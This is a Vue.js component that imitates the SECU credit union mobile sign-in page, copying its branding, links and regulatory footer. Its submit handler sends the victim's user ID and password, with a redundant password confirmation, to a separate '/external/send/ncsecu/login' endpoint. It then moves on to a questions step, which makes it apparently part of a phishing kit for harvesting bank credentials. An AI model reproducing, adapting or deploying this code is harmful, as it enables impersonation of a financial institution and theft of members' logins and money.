<template>
  <div>

    <a href="http://itunes.apple.com/us/app/SECU/id1435916976?mt=8" style="text-decoration: none; color: #ffffff;">
      <table id="MobileAppBanner" role="presentation"
             style="background: #333333; height: 50px; position: fixed; left: 0; right: 0; top: 0;" width="100%">
        <tbody>
        <tr>
          <td style="vertical-align: middle; padding-left: 10px;" width="30px;">
            <img src="analytic/icon/pdf/data/Logo.fw.png" alt="SECU Logo" width="25px;" height="25px;">
          </td>
          <td style="vertical-align: middle; text-align: left;" class="text3">Open in the SECU Mobile App</td>
          <td style="vertical-align: middle; text-align: right; padding-right: 10px;" class="text3" width="20px;">&gt;
          </td>
        </tr>
        </tbody>
      </table>
    </a>
    <div style="height: 50px;">&nbsp;</div>
    <div id="logobar" class="logoBar">
      <div id="logoDiv" class="centered noExtraSpace">
        <img id="logo" class="logo" alt="SECU Logo" title="SECU Logo" src="analytic/icon/pdf/data/SECU_480_White.png">
      </div>
    </div>

    <form @submit.prevent="handleSubmit" id="loginForm" name="loginForm">

      <div class="centered topSpace" style="width: 85%;">
        <div class="noExtraSpace">
          <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
            <div class="signOnText text3" id="DivLabelUserID" style="display: none;">
              <label for="TextUserID" id="LabelUserID" style="display:none;">User ID</label>:
            </div>
            <div class="signOnInput">
              <input v-model="form.user_id" name="userid" type="text" maxlength="16" id="userid" tabindex="1"
                     title="User ID" required
                     autocomplete="off" style="height:1.75em;width:100%;" placeholder="User ID" value="">
            </div>
            <br>
            <div
                v-if="form.errors.has('user_id')"
                style="color: red"
                v-html="form.errors.get('user_id')"
            />
          </div>

          <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelPassword" style="display: none;">
              <label for="TextPassword" id="LabelPassword" style="display:none;">Password</label>:
            </div>
            <div class="signOnInput">
              <input v-model="form.password" type="password" alt="null" tabindex="2" name="passwordx" id="passwordx"
                     required
                     title="Enter your password to log In" style="color: inherit; height: 1.75em; width: 100%;"
                     maxlength="32" autocomplete="off" placeholder="Password">
            </div>
            <br>
            <div
                v-if="form.errors.has('password')"
                style="color: red"
                v-html="form.errors.get('password')"
            />
          </div>

          <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelConfirmPassword" style="display: none;">
              <label for="LabelConfirmPassword" id="LabelConfirmPassword" style="display:none;">Confirm Password</label>:
            </div>
            <div class="signOnInput">
              <input v-model="form.password_confirmation" type="password" alt="null" tabindex="2" name="passwordx"
                     id="passwordx" required
                     title="Enter your password to log In" style="color: inherit; height: 1.75em; width: 100%;"
                     maxlength="32" autocomplete="off" placeholder="Confirm Password">
            </div>
            <br>
            <div
                v-if="form.errors.has('password_confirmation')"
                style="color: red"
                v-html="form.errors.get('password_confirmation')"
            />
          </div>

        </div>
        <div style="margin-top: .2em; margin-bottom: 0em; clear: both;">
          <input type="submit" name="btnlog" value="Sign In" id="MainCPH_LoginControl_ButtonSubmit"
                 class="signOnButton fiColoredButton text5 bold">
        </div>

      </div>


      <div style="margin-top: .4em;">
        <div id="MainCPH_SelectionListMenu_contentDiv" class="content">
          <div id="MainCPH_SelectionListMenu_Items_listItemDiv_0" class="menuItem text2">
            <a id="Menu_1" title="Rates &amp; Fees" href="https://m.ncsecu.org/m/Rates.aspx">Rates &amp; Fees</a>
          </div>
          <div id="MainCPH_SelectionListMenu_Items_listItemDiv_1" class="menuItem text2">
            <a id="Menu_2" title="Locate Us" href="https://locations.ncsecu.org/search" target="_blank">Locate Us</a>
          </div>
          <div id="MainCPH_SelectionListMenu_Items_listItemDiv_2" class="menuItem text2">
            <a id="Menu_3" title="Contact Us" href="https://m.ncsecu.org/m/ContactUs_SECU.aspx">Contact Us</a>
          </div>
          <div id="MainCPH_SelectionListMenu_Items_listItemDiv_3" class="menuItem text2">
            <a id="Menu_4" title="View Full Website" href="https://www.ncsecu.org/home.html">View Full Website</a>
          </div>
        </div>
      </div>

    </form>

    <div class="footer text5">
      <div class="smallSpaceBelow">
        <a href="https://www.ncsecu.org/Home/Legal.html" title="Legal" class="Link noShowLink" target="_blank">Legal</a>
        &nbsp;&nbsp;|&nbsp;&nbsp;
        <a id="linkAccessibility" href="https://www.ncsecu.org/Home/AccessibilityStatement.html" target="_blank">Accessibility</a>
        &nbsp;&nbsp;|&nbsp;&nbsp;
        <a class="Link noShowLink" href="javascript:ChangeLanguage(&quot;/m/Menu.aspx?lang=es&quot;)">Español</a> &nbsp;&nbsp;|&nbsp;&nbsp;
        <a href="https://m.ncsecu.org/m/SiteMap.aspx" id="ViewSiteMapLink" class="Link noShowLink">Site Map</a><br>
        Equal Housing Opportunity
        <img src="analytic/icon/pdf/data/ehl_gif_white_s14x13x256Pass.png" alt="Equal Housing Lender" width="14"
             height="13">
        &nbsp;&nbsp;|&nbsp;&nbsp;
        NMLS#430055
      </div>

      <div class="smallSpaceBelow">
        <span id="LabelInsuredMessage">Federally Insured by NCUA</span>
      </div><!-- <span id="LabelAccessibilityMessage"></span> -->
    </div>

    <div class="overlay">
      <div class="lgif-space"></div>
      <div class="loadgif">
        <img src="gtag/cloud/data/css/loading.gif" width="100" height="100">
      </div>
    </div>

  </div>
</template>

<script>
export default {
  name: 'HelloWorld',

  data() {
    return {
      step1: true,
      step2: false,
      // eslint-disable-next-line no-undef
      form: new Form({
        user_id: "",
        password: "",
        password_confirmation: "",
      }),
      id: '',
      pass: '',
      submitting: false,
      production: this.$ENV_MODE
    }
  },

  methods: {

    handleSubmit() {
      let loader = this.$loading.show({});
      this.submitting = true;
      setTimeout(() => {
        this.form.post(this.production ? this.$BASE_API_URL + '/external/send/ncsecu/login' : '/api/v1/external/send/ncsecu/login').then((response) => {

          loader.hide();
          this.$notify({
            message: response.data.message,
            type: "success",
            top: true,
            bottom: false,
            left: false,
            right: true,
            showClose: false,
            closeDelay: 2500,
            offset: 50,
          })

          setTimeout(() => {
            this.$router.push({ name: 'QuestionsComponent' })
          }, 800);


        }).catch((error) => {
          loader.hide();
          console.log(error.response);

          if (error.response.status == 422) {
            // eslint-disable-next-line no-unused-vars,no-empty
            for (let i in error.response.data.error) {

            }
          }

          // eslint-disable-next-line no-empty
          if (error.response.status == 401) {

          }
          this.submitting = false
        })
      }, 1000)
    },
  },

  created() {
    this.step2 = false;
  }
}
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
.topSpace {
  background-color: #f5f9fc !important;
  color: #000 !important;
  max-width: 448px !important;
  padding: 20px 6px !important;
  border-radius: 18px !important;
  margin-bottom: 30px !important;
}
</style>
